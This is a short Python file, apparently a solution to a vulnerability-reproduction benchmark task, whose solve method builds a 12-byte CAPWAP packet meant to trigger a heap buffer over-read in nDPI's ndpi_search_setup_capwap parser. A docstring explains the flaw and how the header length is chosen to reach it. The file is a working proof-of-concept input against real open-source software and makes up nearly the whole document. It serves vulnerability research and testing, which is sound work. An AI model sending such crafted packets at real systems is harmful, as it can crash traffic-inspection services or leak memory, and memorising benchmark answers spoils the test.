import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept (PoC) for a heap buffer over-read in
        the ndpi_search_setup_capwap function.

        The vulnerability occurs during the parsing of CAPWAP message elements.
        The processing loop checks `while((p + 4) <= end_of_packet)`, ensuring
        a 4-byte message header can be read. However, for a message with
        type 12 and length 1, it then accesses `p[4]`. If `p` points to
        `end_of_packet - 4`, this becomes an out-of-bounds read.

        We can control the initial position of `p` via the CAPWAP header
        length (`hlen`), as `p` is advanced by `hlen` after parsing the header.
        By setting `hlen = packet_length - 4`, we position `p` to trigger
        the vulnerability on the first message element.

        Minimal PoC constraints:
        - `hlen >= 8` => `packet_length - 4 >= 8` => `packet_length >= 12`.
        - `hlen` must be a multiple of 4, so `packet_length` must also be.
        - The minimal `packet_length` is therefore 12 bytes. For this length,
          `hlen` must be 8.

        The PoC is a 12-byte packet:
        - 8-byte header with HLEN field set to 2 (2 * 4-byte words = 8 bytes).
          This is done by setting the first byte to 0x02.
        - 4-byte message element with type=12 and length=1 to trigger the
          vulnerable path, causing a read at `p[4]` (offset 12), which is
          one byte past the end of the buffer.
        """

        # CAPWAP header (8 bytes)
        # The HLEN field (lower 5 bits of the first byte) must be 2 for an 8-byte header.
        header = b'\x02' + b'\x00' * 7

        # The malicious message element (4 bytes)
        # Type = 12 (Radio ID)
        # Length = 1
        # CAPWAP uses network byte order (big-endian). struct.pack packs unsigned shorts (H).
        message = struct.pack('>HH', 12, 1)

        poc = header + message
        return poc
